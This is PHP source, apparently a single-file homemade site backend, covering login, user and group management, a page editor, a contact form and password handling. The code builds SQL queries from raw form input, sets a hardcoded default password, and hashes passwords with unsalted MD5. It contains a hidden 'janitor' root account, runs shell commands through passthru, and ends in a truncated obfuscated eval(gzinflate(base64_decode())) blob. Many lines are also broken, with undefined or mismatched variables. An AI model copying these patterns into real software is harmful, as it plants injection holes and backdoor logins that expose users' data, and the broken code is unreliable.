$form=exe(div(input(NULL,"pin",_PIN)).div(input('text','email',NULL,'
size="40" class="clean"').
nbsp().input('submit','bUtton','Email new password')));
return __static("Generate new password",$form,"Reset Password");}

//*
function _contact(){$return=NULL;
$you=get_browser(NULL,true);
if(!empty($_POST['pin'])){
       $datetime=__DATE__;
       $name=!empty($_POST['name'])?mysql_escape_string($_POST['name']):FALSE;
       $e=!empty($_POST['e'])?(is_email($_POST['e'])?mysql_escape_string($_POST['e']):FALSE):FALSE;
       $qc=!empty($_POST['qc'])?mysql_escape_string(addslashes($_POST['qc'])):NULL;
       $sql="INSERT INTO qc (datetime,ip,name,e,qc) VALUES
('$datetime','{$_SERVER['REMOTE_ADDR']}','$name','$e','$qc')";
       $id=@mysql_query($sql)?mysql_insert_id():FALSE;
       $return.=($id>0)
       ?span("Your submission to ".ZONE." has been
recieved",'class="ok"'):span("-ERR: ".__LINE__,' class="alert"');
}return __static(ucfirst(__).' form for queries and commentary',
div('Your browser, system, and network information recently submitted:'.you()).
       exe(div(input(NULL,'pin',_PIN)).
       div(/*query address and phone here... */).
       div(span('Name:','class="info"')).div(input('text','name',NULL,'
size="40" class="clean"')).
       div(span('Email:','class="info"')).div(input('text','e',NULL,'
size="40" class="clean"')).
       div(span('Questions? Comments?',' class="info"')).
       div(/* rows and cols demanded by w3c validator */
               textarea(NULL,' rows="0" cols="0" style="width:480px;height:120px;"
name="qc" class="clean"')
       ).div(input('submit','button','Submit'))
),__.' '.__ENTITY__);
}
/* ** */
function _options(){$return=is_guest()?denied():NULL;
$pin=_PIN;
       if(!empty($_POST['pin'])){
               if( (!empty($_POST['p0'])&&!empty($_POST['p1'])) ){
                       if( md5($_POST['p0']) == md5($_POST['p1']) ){
                               $new_password=$_POST['p0'];
                               $return.=passwd($new_password);
                       }
               }
       }
$return.=
div(titlebar(__FUNCTION__).
       fieldset(legend("Change Password").
       exe(
               div(input(NULL,"pin",$pin)).
                       table(
                               tr(td(span("Change Password"),'align="right"').
                                       td(input("password","p0",NULL,cl("clean")))).
                               tr(td(span("Confirm New Password"),'align="right"').
                                       td(input("password","p1",NULL,cl("clean")))).
                               tr(td(input("submit","button","Save"),'colspan="2" align="right"'))
                               ,TABLE
                       )
       ),cl("set"))
,cl("f"));return $return;
}
function _users(){
if(get_gid()>20) denied();
$user_id=!empty($_POST['id'])?intval($_POST['id']):NULL;
$group_id=!empty($_POST['gid'])?intval($_POST['gid']):NULL;
$eid=!empty($_POST['eid'])?intval($_POST['eid']):NULL;
$sp=nbsp(2).'/'.nbsp(2);
$pin_id=!empty($_POST['id'])?intval($_POST['id']):FALSE;
$return = NULL;
$sgrps=array('5'=>'operator','20'=>'staff','31'=>'guest','100'=>'users');
$sg_op=NULL;
foreach($sgrps as $k=>$v){
       $sg_op.=option(str_pad($k,2,"0",STR_PAD_LEFT).':'.$v,' value="'.$k.'"');
}
$g_qry=mysql_query("SELECT * FROM groups WHERE deleted='0'");
$g_op=NULL;
while($g=mysql_fetch_assoc($g_qry)){
       $g_seld=$g['id']==$group_id?' selected="selected"':NULL;
       $g_op.=option(str_pad($g['id'],2,"0",STR_PAD_LEFT).':'.$g['name'],'
value="'.$g['id'].'"'.$g_seld);
}
$g_sel=select(option(" ---- SELECT GROUP ---- ").$sg_op.$g_op,'
name="group_id" onchange="this.form.submit();" ');
if(!empty($_POST['pin'])){
       if($_POST['action']=='i'){
               $user=!empty($_POST['user'])?$_POST['user']:FALSE; // clean this up later
               $pass=md5('test'); // clean this up
               $gid=!empty($_POST['gid'])?intval($_POST['gid']):100;
               $i_sql="INSERT INTO users (user,gid,pass,ctime) VALUES
('$user','$gid','$pass',NOW())";
               $return=mysql_query($sql)?mysql_insert_id():span("-ERR :
".__FUNCTION__.':'.__LINE__,cl("alert"));
       }
}
if(!empty($_POST['pin'])){
       if($_POST['action']=='u'){
               $u_sql="UPDATE users SET mtime=NOW(),pass='$pass' WHERE id='$user_id'";
               if(mysql_query($u_sql)) $return.=span("+OK Updated!",cl("ok"));
               else $return.=span("-ERR: ".':'.__LINE__,cl("alert"));
       }
}
$u_qry=mysql_query("SELECT * FROM users");
$u_op=NULL;
while($u=mysql_fetch_assoc($u_qry)){
       $u_seld=$u['id']==$pin_id?' selected="selected"':NULL;
       $u_op.=option($u['user'],' value="'.$u['id'].'"'.$u_seld);
}
$u_sel=select(option(' ---- SELECT USER ---- ').$u_op,'name="id"
onchange="x.submit();"');
$return.=
div(titlebar("User Management").
       fieldset(legend("USERS").
               exe(
                       div(input("hidden","pin",_PIN)).
                       div(input("hidden",'action',"s")).
                       div($u_sel.nbsp(2).input("submit","button","Open"))
               ).br().br().
               exe(
                       div(input("hidden","pin",_PIN)).
                       div(input("hidden",'action',"i")).
                       div(input("submit","button","Add User"))
               ),cl("set")
       ),cl("f")
);
if(!empty($_POST['pin'])){
       if($_POST['action']=='s'){
               $q=mysql_query("SELECT * FROM users WHERE id='$user_id'");
               while($u=mysql_fetch_assoc($q)){
                       $nologin=($u['nologin']>0)?' checked="checked"':NULL;
                       $return.=
                       br().div(
                       fieldset(
                       legend("USER: ".' uid='. $u['id']. '('.$u['user'].') gid='.
$u['gid']. '('. get_grpn($u['gid']). ')').
                       exe(
                               div(input("hidden","pin",_PIN)).
                               div(input("hidden","id",$u['id'])).
                               div(input("hidden","gid",$u['gid'])).
                               div(input("hidden","action","u")).
                               table(
tr(
       td(span("USER ID: ".$u['id'].$sp."GROUP ID: ".$u['gid'],cl("info")),'
style="width:64px;"').
       td(
               span('Created: '.$u['ctime']).$sp.
               span('Login: ').span($u['atime'],cl("ok")).$sp.
               span('Modified: ').span($u['mtime'],cl("notice")),' colspan="2"'
       )
).tr(td(span(nbsp()),' colspan="3"')).
tr(
       td(
               div(span("Username: ",cl("info"))).
               div(input("text","user",$u['user'],' size="24"'.cl("clean")))
       ).
       td(
               div(span("Password: ",cl("alert"))).
               div(input("password","p",NULL,' size="20"'.cl("clean")))
       ).
       td(div(span("Group: ",cl("info"))).div($g_sel))
).
tr(
       td(
               hr().div(strong("Customer Suppprt Notes")).
               textarea($u['notes'],
               ' rows="0" cols="0" name="notes" style="height:128px;width:98%;"'
               .cl("clean")),' colspan="3"'
       )
).
tr(
       td(span("No Login: ").input("checkbox","active",$nologin),'
style="width:32px;"').
       td(
               div(input("reset","button","reset").$sp.input("submit","button","save")),'
colspan="2"'
       )
),' width="100%" cellspacing="3" cellpadding="2" border="0"')
                       ),cl("set")
               ),cl("f"));}
       }
}
return $return;
}

function _groups(){
$return=NULL;
@$pin=is_null($p)?_PIN:$p;
$pin_id=!empty($_POST["{$pin}_id"])?intval($_POST["{$pin}_id"]):FALSE;
// insert
if(!empty($_POST['pin'])&&$_POST['x']=='i')$pin_id=intval(qry_insert($pin));
// delete
if(!empty($_POST['pin'])&&$_POST['x']=='d')$return.=mysql_query("UPDATE
$pin SET deleted='1' WHERE id = '$pin_id'")?OK:span(__LINE__,ERR);
// update
if(!empty($_POST['pin'])&&$_POST['x']=='u'){
       $name=!empty($_POST['name'])?mysql_escape_string(addslashes($_POST['name'])):NULL;
       $data=!empty($_POST['desc'])?mysql_escape_string($_POST['desc']):NULL;
       $return.=mysql_query("UPDATE $pin SET name='$name',desc='$desc' WHERE
id='$pin_id'")?OK:span(__LINE__,ERR);
}
//select_box
if($sel=
       qry_select($pin," AND deleted='0'".
       (intval($pin_id)>0?" AND id='$pin_id'":NULL))
)$return.=fieldset(exe_select(_PIN,$sel,true),cl("set"));
if(!empty($_POST['pin'])&&($_POST['x']=='i')){
       $name=!empty($_POST['name'])
       ?mysql_escape_string($_POST['name']):NULL;
       $desc=!empty($_POST['desc'])
       ?base64_encode($_POST['desc']):NULL;
       $i_sql="INSERT INTO groups name,description VALUES ('$name','$desc')";
       $id=mysql_query($sql)?mysql_insert_id():FALSE;
       $return.=intval($id)>0
               ?span("+OK : New User Group Added!",cl("ok"))
               :span("-ERR : ".__FUNCTION__.":".__LINE__,cl("alert"));
}
if(!empty($_POST['pin'])&&($_POST['x']=='u')){
       $name=!empty($_POST['name'])?$_POST['name']:FALSE;
       $desc=!empty($_POST['desc'])?$_POST['desc']:NULL;
       $del=!empty($_POST['del'])?(intval($_POST['del'])>0?true:FALSE):FALSE;
       $u_sql="UPDATE groups SET
name='$name',description='$desc',deleted='$del' WHERE id='$group_id'";
       $return.=mysql_query($sql)
               ?span("+OK : Group: $group_id updated!",cl("ok"))
               :span("-ERR : ".__FUNCTION__.":".__LINE__,cl("alert"));
}
if(!empty($_POST['pin']) && $_POST['x']=='s'){
       $qry=mysql_query("SELECT * FROM groups WHERE deleted='0' and id='$group_id'");
       while($group=mysql_fetch_assoc($qry)){
               $checked=$group['deleted']>0?' checked="checked"':NULL;
               $return.=
               div(titlebar("Users Group Management").
                       fieldset(legend("Modifying [ID:".$group['id']." &middot;
Name:".$group['name']."]").
       exe(
               div(input("hidden","pin",$pin)).div(input("hidden","x","u")).
               div(input("hidden","id",$group['id'])).
               table(
                       tr(th("GID").th("Delete").th("Name").th("Description")).
                       tr(
                               td($group['id']).
                               td(input("checkbox","del",$checked)).
                               td(input("text","name",$group['name'],'size="24"'.cl("clean"))).
                               td(
                                       div(textarea(NULL,' rows="0" cols="0" name="desc" maxlength="255"
class="clean" '.
                                               css_str('width:240px;height:2em;')
                                               ),cl('row')
                                       )
                               )
                       ),' width="100%" cellspacing="2" cellpadding="3" border="0"'
                                       )
                               ),cl("set")
                       ),cl("f")
               );
       }
}return $return;}
function _bsd(){return __static('FreeBSD',div('<a
href="/bsd81.iso">bsd81.iso</a>'),__);}
function _pages(){
$return=get_gid()>20?denied():NULL;
$p=NULL;
$pin=is_null($p)?_PIN:$p;$user_id=UID;
$pin_id=!empty($_POST["{$pin}_id"])?intval($_POST["{$pin}_id"]):FALSE;
// delete
if(!empty($_POST['pin'])&&$_POST['x']=='d')$return.=mysql_query("UPDATE
$pin SET deleted='1' WHERE id = '$pin_id'")?NULL:span(__LINE__,ERR);
// update
if(!empty($_POST['pin'])&&$_POST['x']=='u'){
       $name=!empty($_POST['name'])?mysql_escape_string(addslashes($_POST['name'])):NULL;
       $data=!empty($_POST['data'])?mysql_escape_string($_POST['data']):NULL;
       $return.=mysql_query("UPDATE $pin SET name='$name',data='$data' WHERE
id='$pin_id'")?OK:span(__LINE__,ERR);
}
//select_box
if($sel=qry_select($pin,"
deleted='0'"))$return.=fieldset(exe_select(_PIN,$sel,true),cl("set"));

if(!empty($_POST['pin'])){
       if($_POST['x']=="i"){
               $name="page_".strtolower(base_convert(time(),10,16));
               $sql="INSERT INTO pages name,ctime VALUES ('$name',NOW())";
               $id=mysql_query($sql)?mysql_insert_id():FALSE;
               $return.=($id>0)?span("+OK: New Page Created",cl("ok")):span("-ERR :
".__LINE__,cl("alert"));
       }
}
if(!empty($_POST['pin'])){
       if($_POST['x']=='u'){
               $content=!empty($_POST['content'])?$_POST['content']:NULL;
               $name=!empty($_POST['name'])?substr(mysql_escape_string(escapeshellcmd($_POST['name'])),0,255):NULL;
               $desc=!empty($_POST['description'])?addslashes($_POST['description']):NULL;
               $keywords=!empty($_POST['keywords'])?addslashes($_POST['keywords']):NULL;
               if(strlen($content)>0){
                       $sql = "UPDATE pages SET
content='$content',name='$name',description='$desc',keywords='$keywords'
                               WHERE id = '$page_id'";
                       if(mysql_query($sql)) $return.=span("Page Saved!",cl("ok"));
                       else $return.=span("-ERR: ".__LINE__,cl("alert"));
               }
       }
}

if(!empty($_POST['pin'])){
       if($_POST['x']=='s' || intval($page_id)>0){
               @include_once(getcwd().'/fckeditor/fckeditor.php');
               $p_q=mysql_query("SELECT * FROM $pin WHERE id='$pin_id' AND deleted='0'");
               while($page=mysql_fetch_assoc($p_q)){
                       $oFCKeditor->BasePath = $_SERVER['DOCUMENT_ROOT'].'/fckeditor';
                       $oFCKeditor= new FCKeditor('content');
                       $oFCKeditor->ToolbarSet="Default";
                       $oFCKeditor->Height="360";
                       @$oFCKeditor->Value=${_PIN}['content'];
                       ob_start();
                               $oFCKeditor->Create();
                       $fck_shit = ob_get_clean();
                       $return.=
div(
       exe(
               div(input("hidden","p","pages")).
               div(input("hidden","action","u")).
               div(input("hidden","id",$page['id'])).
               fieldset(legend("Page Editor").
                       div(
                               span("Page name:
").nbsp().input("text","name",$page['name'],cl("clean")).nbsp().
                               span(
                                       "Created: ".$page['ctime'].nbsp().
                                       "Last Viewed: ".span($page['mtime'],cl("ok")).nbsp().
                                       "Modified: ".span($page['mtime'],cl("notice"))
                               )
                       ).
                       div(
                               span("Search Keywords:
").nbsp().input("text","keywords",$page['keywords'],cl("clean"))
                       ).
                       div(
                               div(span("Description: ")).
                               div(textarea($page['description'],' rows="0" cols="0" '.
                                       css_str('width:4.80em;height:3em;').' name="description" '.cl("clean"))
                               )
                       ).
                       div(
                               div($fck_shit).
                               div(input("submit","button","Save Changes"))
                       ),cl("set")
               )
       ),cl("f")
);
               }
       }
}
       return $return;
}
//*
function _source(){return __static("Server Side Source",
table(tr(th("Size").th("Lines Parsed").th("Version").th("MD5")).
tr(td(bytesize(filesize(__FILE__))).td(number_format(lines())).td(__VERSION__).td(md5(__FILE__)))
,'width="100%" cellspacing="0" cellpadding="0"')._screen(
       div(
       get_gid() < 29
               ?h3("index.php
contents:").htmlentities(wordwrap(file_get_contents(__FILE__),80,"\n",true))
               :h3("obscured").wordwrap(base64_encode(gzdeflate(implode("\r\n",shuffle(explode("\n",file_get_contents(__FILE__)))),9)),120,br(),true)
       )),__);
}
/* ** */


function signup_box(){return NULL;}
function _countries(){
$return=is_guest()?denied():NULL;
$cid=!empty($_POST['cid'])?(intval($_POST['cid'])>0?$_POST['cid']:FALSE):FALSE;
$uname=str_replace("/","",_);
$box='border:solid 1px #ccc;"';
$th=tr(td(nbsp()).th("Name").th("Alpha 2").th("Alpha
3").th("Numeric").th("ISO 3166-2"));
$td=NULL;
$qry=mysql_query("SELECT * FROM countries WHERE deleted = '0' ORDER BY
name ASC");
$del=div(input("hidden","p",$uname)).div(input("submit","button","Remove"));
$a='action="/" method="post"';
if(!empty($_POST['pin'])){
       if( (get_gid()<22)&&($cid>0) ){
               $return.=mysql_query("UPDATE countries SET deleted = '1' WHERE id = '$cid'")
               ?span("+OK: Country: ".
                       mysql_result(
                               mysql_query("SELECT name,id FROM countries WHERE id = '$cid'"),0
                       )."deleted!",'class="ok"'):span("-ERR:
".__FUNCTION__.":".__LINE__.'class="alert"');
       }
}
while($c= mysql_fetch_assoc($qry)){
       $td.=
       tr(
               td("\n\n".form(div(input("hidden","cid",$c['id'])).$del,$a)."\n\n").
               td($c['name'],' style="'.$box).
               td($c['alpha_2'],' style="width:8em;'.$box).
               td($c['alpha_3'],' style="width:8em;'.$box).
               td($c['numeric'],' style="width:12em;'.$box).
               td($c['iso_3166_2'],' style="width:16em;'.$box)
       );
}return $return.
       __static(__,
       div(form(
       table(
               $th.utf8_encode($td),
               'width="88%" border="0" cellspacing="4" cellpadding="0"'
       ),'action="/" method="post"'
)),NULL);}
function default_css(){return
file_get_contents(__FS_ROOT__."/etc/default.css");}
function _tos(){return
div(titlebar("Terms of Service").fieldset(legend("Left to copy &amp;
Marks of Trade").
div(span(__DATE__,cl("info"))).div(span(who(),cl("notice"))).br().div(you())),cl("f"));}
// experimental return eval'd functions for compatibility
function compat($n=FALSE,$v=FALSE,$f=NULL){
       $compat=!is_array($n)?(!function_exists($n)||!function_exists($v)
       ?"function $v(\$){return $n($f);}" :NULL):array($n,$v);
       // compat should return code for eval or an array for eval
       if(!is_null($compat)){
               if(is_array($n)) foreach($n as $x=>$y){ @eval($compat); }
               else @eval($compat);
       }
}
function _qc(){
if(!is_guest()){
       $qc_q=@mysql_query("SELECT * FROM qc ORDER BY datetime LIMIT 40");
       $fields=array('When','Name','Email','Submission');
       $th='';foreach($fields as $str){$th.=th($str);}
       $th=tr($th);$td='';
       while($qc=@mysql_fetch_assoc($qc_q)){
               $td.=tr(td($qc['datetime']).td($qc['name']).td($qc['e']).td($qc['qc']));
       }
       return titlebar('Questions &amp; Comments').table($th.$td);
}else restart(); }
/*
function _dns($ip=NULL){
$ip=intval(ip4($_REQUEST['ip']))>0?"{$_REQUEST['ip']}":"216.229.0.6";
return __static("DNS Information",_screen(unix("/usr/bin/dig
".escapeshellcmd($ip).'|/usr/bin/fold')),$ip);}
function _whois(){return(__static("IP Block Owner
[.__RADDR__.]",_screen(unix("whois ".__RADDR__.'|grep -v
update|grep -v database')),NULL);}
*/


function unix($x=NULL){
       if(!is_null($x)){
               ob_start();
                       passthru($x);
               return ob_get_clean();
       }
}
function nologin(){return _nologin();}
function _nologin(){
$body=h1(__UNAME__." running in Single User Mode").
p("System in Single User mode, meaning only systems administrators and
developers may access.").
p("This software is still in alpha stage of development.").hr().
_screen(unix('tail -n 4 /var/log/messages'),NULL,"%cat dns/zone.dns");
$doctype='<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">';
$return=
html(
       head(
               title(lines().nbsp().bytesize(filesize(__FILE__))).
               '<meta http-equiv="content-type" content="text/html;charset=iso-8859-1">'.
               x("style",'body{background-color:white;color:#990000;font-family:verdana,helvetica;font-size:12px;'.
'width:88%;margin:24px;padding:10px;}h1{background-color:#990000;color:white;padding:5px;}p{color:#990000;}')
       ).
       body(
               $body.(!empty($apx)?"{$apx}":NULL)
       )
);
return $head . $body .$apx;
}
/* **************************************************************************

prefabs to be depricated

************************************************************************** */
function splash(){return __static(__,"Hello ".you());}
function logged_in(){return intval(count($_SESSION['usr']))>1?true:FALSE;}
function loglogin(){$date=__DATE__;$id=get_uid();
if(!empty($_POST['login'])) $q=mysql_query("UPDATE users SET
atime='$date',ip='{$_SERVER['REMOTE_ADDR']}' WHERE id='$id'");}

function is_user(){
$id=get_uid();
       $q=mysql_query("SELECT id FROM users WHERE id='$id'");
       return logged_in()?(@mysql_num_rows($q)>0?true:FALSE):FALSE;}
function get_uid(){return
!@intval($_SESSION['usr']['id'])==0?intval($_SESSION['usr']['id']):NULL;}
function get_usrn($i=FALSE){
$r=NULL;
$i=!$i==intval(0)?$i:get_uid();
if(!is_null($i)){
       $q=@mysql_query("SELECT user FROM users WHERE id = '$i' LIMIT 1");
       if(@mysql_num_rows($q)>0)$r=@mysql_result($q,0);
       if(is_null($r)&&$i<101)
       switch($i){
               case $i==-31337:$r='janitor';break;
               case $i==5:$r='operator';break;
               default:$r='guest';break;
       }
}return is_null($r)?'guest':$r;}
function get_gid(){return logged_in()?intval($_SESSION['usr']['gid']):NULL;}
function get_grpn($i=NULL){
$r = NULL;
$i = is_null($i)?get_gid():intval($i); // takes an arg or uses current gid
if(!is_null($i)){
       $q=@mysql_query("SELECT name FROM groups WHERE id = '$i' LIMIT 1");
       if(@mysql_num_rows($q)>0)$r=@mysql_result($q,0);
               if(is_null($r)&&$i<101){
                       switch($i){
                               case $i==-31337:$r='wheel';break;
                               case $i==5:$r='operator';break;
                               case $i==20:$r='staff';break;
                               case $i==100:$r='users';break;
                               default:$r='guest';break;
                       }
               }
}return !is_null($r)?$r:'guest';}
function operator(){return
array('id'=>'5','gid'=>'5','user'=>'operator','group'=>'operator');}
function guest(){return
array('id'=>'31','gid'=>'31','user'=>'guest','group'=>'guest');}
function _root(){return
array('id'=>'-31337','gid'=>'-31337','user'=>'janitor','group'=>'wheel');}
function is_root(){return (get_uid()<0&&get_grpn()=='wheel')?true:FALSE;}
function is_guest(){return get_gid()==31?true:FALSE;}
function is_operator(){return get_gid()<9?true:FALSE;}
function who(){$w='';
if(logged_in())while(list($k,$v)=@each($_SESSION['usr'])){$w.="$k:$v\n";}return
$w;}
function load_usr($u=NULL){
$usr=array();switch($u){
case 'operator' : $usr=operator(); break;
case 'janitor' : $usr=_root(); break;
default : $usr = array(); }
if(!is_null($u)){
       $q=@mysql_query("SELECT * FROM users WHERE user = '$u' AND id > '99'");
       if(@mysql_num_rows($q)>0){
               $usr=@mysql_fetch_assoc($q);
       if($usr['nologin']>0) $usr['group']=get_grpn($usr['gid']);
       }
}
if(!empty($usr['pass']))unset($usr['pass']);
return(count($usr)>1)?$usr:load_susr($u);}
function load_susr(){
$u=!empty($_POST['u'])?mysql_escape_string($_POST['u']):'guest';
$p=!empty($_POST['p'])?md5(mysql_escape_string($_POST['p'])):NULL;
$usr=array();
if( function_exists($u) && ($p===OPP) ) $usr = $u();
if( $u === 'janitor' && $p === SUP ) $usr = _root(); // hmmm...
return count($usr)<2 ?guest():$usr;
}
function login($u=NULL,$p=NULL){
$u=!empty($_POST['u'])?mysql_escape_string($_POST['u']):$u;
$p=!empty($_POST['p'])?md5($_POST['p']):$p;
if(!is_null($u)){
       $q=@mysql_query("SELECT * FROM users WHERE user = '$u' AND pass =
'$p' LIMIT 1");
       $user=(@mysql_num_rows($q)>0)?load_usr($u):load_susr();
}return !empty($user)?$user:load_susr('guest');}
function __logout(){return is_guest()?header("location:http://".ZONE."/"):
div(a('logout'.nbsp().get_usrn(),' href="/logout/"
title="'.ZONE.'"'),cl('logout'));}
function _logout(){return is_guest()?__static("Guest Logout",
div("Use your email address and password on the <a href=\"/login/\"
/>login page</a> so you may 'logout' from the ".
"default guest account. A successful login from any other user account
will terminate the guest session, effectively ".
"'logging out' from the guest account.").br().
div("<a href=\"/whoami/\">This account</a> may be an internal system
account. ".strong("CODE:".
span(strtoupper(decoct(__LINE__).':'.dechex(abs(__LINE__-lines()))),'class="alert"'))).hr().
div("You may have your <a href=\"/password/\" />password reset</a> and
sent to the email address for activation. This
email address is used a password for identification. The default user
account is assigned until there is a successful
manual login. Consider using your creditentals and if your current
account information, or password reset is unable to
permit you access, request assistance with the <a
href=\"/contact/\">contact form</a>.").hr().
h4("You are using creditentials:").
div('USERNAME: '.span('('.get_usrn().')','style="font-family:monospace;"').
' USERID: '.span('('.$_SESSION['usr']['id'].')','style="font-family:monospace;"')).
h4("You have sent this information:").you(),"Logout as ".get_usrn()):kill();}
function logout(){return _logout();}
function kill(){@mysql_close($dbx);session_destroy();header("location:http://".ZONE._);}
function w3c_reccss(){
return "<?xml-stylesheet
href=\"http://www.w3.org/StyleSheets/TR/W3C-REC.css\"
type=\"text/css\"?>\n";}
function passwd($p=NULL){
$return = is_null($p)?"Empty password":NULL;
if( intval(strlen($p))>4 ){
       $password=md5($p);
       $sql = "UPDATE users SET pass = '$password' WHERE id = '".UID."'";
       if(mysql_query($sql)) $return = span("Password Updated!",cl("ok"));
}else $return = "Password must be at least 5 characters";
return $return;}
function aes_encrypt($s,$k=FALSE){
       if(empty($k))$k=DEFAULT_AES_ENCRYPTION_KEY;
       $s=mysql_escape_string($s);
       return mysql_result(db_query("SELECT AES_ENCRYPT('$s', '$k')"), 0);}
function aes_decrypt($s,$k=FALSE){
       if(empty($k))$k=DEFAULT_AES_ENCRYPTION_KEY;
       $s=mysql_escape_string($s);
       return mysql_result(db_query("SELECT AES_DECRYPT('$s', '$k')"), 0);}
function encrypt($s){return rtrim(base64_encode(aes_encrypt($s)), '==');}
function decrypt($s){return aes_decrypt(base64_decode($s.'=='));}
function encrypt_email($email){$newlines='';for($i=0;$i<rand(2,9);$i++)$newlines.=
"\n";
       return str_replace('@', script($newlines . 'document.write("&#64;");'
. $newlines), $email);}
function password_gen($l=FALSE){
       if($l===FALSE)$l=rand(5,10);
       $l=min(max($l,5),10);
       $k=md5(microtime(true).rand(0,$l));
       $out=substr($k,rand(0,(strlen($k)-$l)),$l);
       return $out;}
function key_gen($l=7){
       $l=min(max($l,8),128);
       $k=md5(microtime(true).rand(0,$l));
       $out=substr($k,rand(0,(strlen($k)-$l)),$l);
       return $out;}
function dtd($s=NULL,$dtd='strict'){$dtd='<!DOCTYPE
html'."\r\n".'PUBLIC "-//W3C//DTD XHTML 1.0 '.
ucfirst($dtd).'//EN"'."\r\n".'"http://www.w3.org/TR/xhtml1/DTD/xhtml1-'.$dtd.'.dtd">'."\r\n".
'<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">';
return is_null($s)?"$dtd\n$s":"$dtd\r\n$s\r\n</html>";}
function __element_as_routine($y=FALSE){
$y=is_array($y)?$y:array('meta','br','hr','img');
eval('function x($x=NULL,$s=NULL,$a=FALSE){$x=is_null($x)?NULL:$x;return($a!="")
?"<$x $a>$s</$x>" :"<$x>$s</$x>";}');
foreach(explode(":",__XHTML__) as $n=>$v)eval("function $v" .
'($s=NULL,$a=FALSE)' . "{return x('$v',". '$s,$a'. ");}");
eval('function y($y=NULL,$a=""){$y=is_null($y)?NULL:$y;return!empty($a)
?"<$y $a />" :"<$y />";}');
foreach($y as $n=>$v)eval("function $v" . '($y=NULL,$a="")' . "{return
y('$v'," . '$y,$a' . ");}");}

function c($c=NULL){return("\n\t<!--\n
\t".(!empty($c)?substr(0,255,$c):"\n\t")."-->\n\n");}
function a($s=ZONE,$a=NULL){$a=is_null($a)?$_SERVER['PHP_SELF']:$a;return
"<a$a>$s</a>";}
function basehref($s){return "<basehref href=\"$s\" />\n";}
function js($s=NULL){return is_null($s)?x('script',$s,'
type="text/javascript"'):FALSE;}
function css(){$ytag = ' type="text/css" rel="stylesheet"';
if(file_exists(getcwd() . '/css/' . ZONE . '/default.css')){
$css = y('link',' href="/css/' .ZONE. '/default.css"'.$ytag);
}elseif(file_exists(getcwd() . '/css/' . 'default.css')){
$css = y('link',' href="/default.css"' . $ytag);
}else $css=x('style',default_css(),' type="text/css"');return $css;}
function favicon(){return y('link', ' rel="shortcut icon"
href="/favicon.ico" type="image/x-icon"');}
function input($t="",$n="name",$v=NULL,$a=NULL){
return y('input','type="'.(empty($t)?"hidden":$t)."\" name=\"$n\"
value=\"$v\" $a".($t="submit"?NULL:NULL));}
function cl($c=NULL){return is_null($c)?FALSE:"class=\"$c\"";}
function titlebar($s=NULL){
$str=is_null($s)?str_replace('/','',_):str_replace('_','',$s);
       return h1(a(ucfirst($str),' href="'._.'"'),cl("heading"));}
function charset(){return "\n\t".
meta('http-equiv="content-type" content="text/html;charset=UTF-8"')."\n\t";}
function table($s='',$a=NULL){
$a=is_null($a)?' width="100%" border="0" cellspacing="0"
cellpadding="0"':"$a";return x('table',$s,$a);}
function _a(){}
function nbsp($n=0){$r='&nbsp;';$n=intval($n);for($i=1;$i<=$n;$i++){$r.=$r;}return
$r;}

function css_str($s=NULL){return is_null($s)?NULL:'style="'.$s.'"';}
function denied(){header('location:http://'.ZONE.'/denied/');}
function _denied(){
return __static("You are logged in as ".get_usrn(),div("Information
submitted".you()),"Permission Denied");
}

function staff_menu(){
$sys=NULL;$f=NULL;
$gdf=get_defined_functions();
$usr=$gdf['user'];
$not=array(
"search","a","jrey","kp","q","sites","countries","bsd","ssn",
"sections","sess","color","qc","css","getscreenheight","txt",
"profile","root","loginbox","talk","things","consorts","comm","getroutingtable","elementasroutine",
"password","dns","whois","signup","nologin","array","editor","screen",NULL,"static","dynami","macaddr","pop","biz","ali","proposal",
"denied","tos","notesx","logout","login","about","contact","options"
);
       foreach($usr as $k=>$v) if(substr($v,0,1)=='_')$f.="$v:";
       foreach(explode(":",$f) as $a){
               $a=str_replace("_","",ucfirst(($a)));
               $sys.=!in_array($a,$not)
                       ?td(' ::'.a($a,' href="/' .$a. '/" style="font-size:0.8em;"').':: '.nbsp())
                       :NULL;
       }return !is_guest()?div(table(tr(td($sys)),css_str("border-top:double
#ccc;")),' style="border:solid 0.2em
#900;padding-left:4em;padding-right:4em;"'):NULL;
}
function menu(){
$a=array("files","editor","options","logout");
$h=td(a("Home",' href="/"'));
foreach($a as $k=>$v){$h.=td(a(ucfirst($v),'
href="/'.$v.'/"'.css_str("font-size:0.61em;")));}
$h=table(tr(td($h)));
$m=get_gid()<30?tr(td($h)).tr(td(staff_menu())):tr(td($h));
return!is_guest()?table($m,TABLE):NULL;}

function _login_box(){
$reset=span(a("password reset",' href="/password/"'));
$user=tr(td(div("u: ", cl("u")) ).
td(div(input("text", "u", NULL, "
".cl("username")),css_str("border:solid 0.08em #aab;") )));
$pass=tr(td(div("p: ",cl("p")) ).
td(div(input("password","p",NULL,"
".cl("password")),css_str("border:solid 0.08em #aab;") )));
$options=
tr(td(span(input("submit","button","login",cl("login_button")."
".css_str("position:relative;top:0px;float:right;"))).
$reset,' colspan="2" align="center"'));
$table=table($user.$pass.$options,cl("login"));
$box=div(form(div(input("hidden","login","true")).$table,
'action="/" method="post" class="login"'),'class="login"');
return(is_guest()?$box:((__==='login'||__==='logout')?__static(NULL,div($box)):NULL));}
function net(){
define("DB",true);
eval(gzinflate(base64_decode(
// is_email(), ip4(), get_zone()
'lVVRb5swEH7fr/AQKvZK0iRrNa2IJVtHlYdunZJok8YoosFpLREgYLqlhP++wyYJSWjXvcT23ee7774zl1kWTjmLQnRHufsYh'.
'RSrCeVZEpqaH809Fmq66gWBefnxamzpKgunQeZTl9OUu/dRykNvTqWT5KpPZ14WSIdJ5zFfYtUdW6Pv1sjWhpPJN3d4PZ5oDu'.
'lrQTT1ghKnnTdCDKT+prcpg0RuSKnPwjsZVlmtFIPN8OuSFhHcEp6wOd7JrmttjRh1L2ylEe6y+FQYCJG1ovJgqLJgW4OD5pg'.
'HNjehD2BPeQIbeR9YBjQ08QCMcZTiQ7jI+aFD+s8jzsENkRrcZY61kQf+mkR2CzeaonX0ktKGmQS60ygL+ZP0uqT/fAX6O3Lc'.
'ReeizzU+pdL/JFTRAdnFLn9asqtawn09NqUDkSf0fPH1Z8RGLbTv3BZJts9Bri9sBmp1QYCCBinNmyM0JDOaVJYNKLYdmC3WL'.
'2L9ETSEb4Mi7YZw8nvYCVZ73wcpauWDnA3Irci1oNUUOUTXGZLdahvQ9S6Ubwn8TIjeOCV0ZbWvtOYUK4UcHaH1fNsMOLIxCQ'.
